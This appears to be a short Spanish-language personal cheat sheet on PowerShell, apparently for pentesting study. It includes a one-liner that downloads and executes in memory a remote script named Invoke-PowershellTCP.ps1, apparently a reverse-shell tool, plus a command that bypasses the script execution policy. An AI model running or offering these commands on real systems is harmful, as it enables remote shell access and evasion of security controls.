# Powershell

Tags: #Windows #Powershell 

```powershell 
# Ejecutar un comando en powershell desde la terminal 'cmd' en Windows

❯ powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Omar/Scripts/main/Invoke-PowershellTCP.ps1')" 
```

```powershell
❯ Import-Module .\Script.ps1       # Importamos un modulo para utilizar los submodulos 
```

```powershell
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en PS
 	# ep = Ejecutar politicas 
❯ .\script.ps1       # Ejecutar el script en PS
```